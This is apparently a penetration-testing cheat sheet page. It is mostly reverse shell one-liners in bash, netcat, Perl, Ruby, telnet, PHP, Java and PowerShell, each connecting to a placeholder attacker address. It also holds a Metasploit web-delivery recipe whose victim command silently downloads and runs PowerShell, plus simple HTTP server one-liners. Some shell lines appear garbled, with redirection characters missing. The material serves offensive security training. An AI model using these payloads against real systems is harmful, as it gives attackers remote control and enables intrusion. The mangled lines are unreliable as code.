---
title: Shells and Web Servers
category: Exploitation
order: 6
---

> **Reverse Shell One-Liners**

Listener | <code> nc -l -v attackerip 4444 </code>
Bash | <code> exec /bin/bash 0&0 2>&0 </code>
Bash | <code> 0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196 </code>
Bash | <code> exec 5<>/dev/tcp/attackerip/4444 <br> cat <&5 | while read line; do $line 2>&5 >&5; done  # or: <br> while read line 0<&5; do $line 2>&5 >&5; done </code>
NC | <code> nc -c /bin/sh attackerip 4444 </code>
NC | <code> /bin/sh | nc attackerip 4444 </code>
NC | <code> rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4444 0/tmp/p </code>


**Perl Reverse Shell**

{% highlight perl %}
#Linux
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

#Windows
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
{% endhighlight %}

**Ruby**
{% highlight ruby %}
#Linux
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

#Windows
ruby -rsocket -e 'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
{% endhighlight %}

**Telnet**

{% highlight bash %}
rm -f /tmp/p; mknod /tmp/p p && telnet attackerip 4444 0/tmp/p

telnet attackerip 4444 | /bin/bash | telnet attackerip 4445   # Remember to listen on your machine also on port 4445/tcp
{% endhighlight %}

**PHP**

{% highlight php %}
php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
(Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)
{% endhighlight %}

**Java**

{% highlight java%}
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
{% endhighlight %}

**Powershell**

{% highlight powershell %}
#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
#$client = New-Object System.Net.Sockets.TCPClient('192.168.254.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

#$sm=(New-Object Net.Sockets.TCPClient('192.168.254.1',55555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
{% endhighlight %}

* [Reverse Shell One liners](https://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html)
* [Bash, PHP, Netcat, Telnet, Perl, Ruby, Java, Python, Gawk](https://highon.coffee/blog/reverse-shell-cheat-sheet/)

> **HTTP Servers One-Liners**

Python 2 | python -m SimpleHTTPServer 8000
Python 3 | python -m http.server 8000
ruby | <code> ruby -rwebrick -e'WEBrick::HTTPServer.new(:Port => 8000, :DocumentRoot => Dir.pwd).start' </code>
ruby 1.9.2+ | ruby -run -ehttpd . -p8000
perl | <code> perl -MHTTP::Server::Brick -e '$s=HTTP::Server::Brick->new(port=>8000); $s->mount("/"=>{path=>"."}); $s->start' </code>
php | php -S 127.0.0.1:8000
IIS Express | "C:\Program Files (x86)\IIS Express\iisexpress.exe" /path:C:\MyWeb /port:8000"
OpenSSL | <code> openssl req -newkey rsa:2048 -nodes -x509 -subj '/CN=name-you-want.example.com' -days 3650 -out server.cert -keyout server.key <br> openssl s_server -accept 7781 -cert server.cert -key server.key -WWW </code>


> **Powershell HTTP Servers**

{% highlight powershell %}
$Hso = New-Object Net.HttpListener
$Hso.Prefixes.Add("http://+:8000/")
$Hso.Start()
While ($Hso.IsListening) {
    $HC = $Hso.GetContext()
    $HRes = $HC.Response
    $HRes.Headers.Add("Content-Type","text/plain")
    $Buf = [Text.Encoding]::UTF8.GetBytes((GC (Join-Path $Pwd ($HC.Request).RawUrl)))
    $HRes.ContentLength64 = $Buf.Length
    $HRes.OutputStream.Write($Buf,0,$Buf.Length)
    $HRes.Close()
}
$Hso.Stop()
{% endhighlight %}

> **Script Web Delivery** 

On the attacker machine: 
{% highlight bash %}
msf > use exploit/multi/script/web_delivery
msf exploit(web_delivery) > show targets
            ...targets...
msf exploit(web_delivery) > set TARGET <target-id>
msf exploit(web_delivery) > show options
            ...show and set options...
msf exploit(web_delivery) > exploit
{% endhighlight %}

On the victim: 
{% highlight bash %}
powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://10.10.10.10:80/[randomstring]'))
{% endhighlight %}

Reference:
* [securitypadawan](https://securitypadawan.blogspot.com/2014/02/php-meterpreter-web-delivery.html)


> **Useful Resources** 

* [Powershell HTTPS Shell](http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-3.html)
* [powercat](https://www.sans.org/reading-room/whitepapers/testing/powercat-35807)
* [powercat](https://github.com/besimorhino/powercat/blob/master/powercat.ps1)

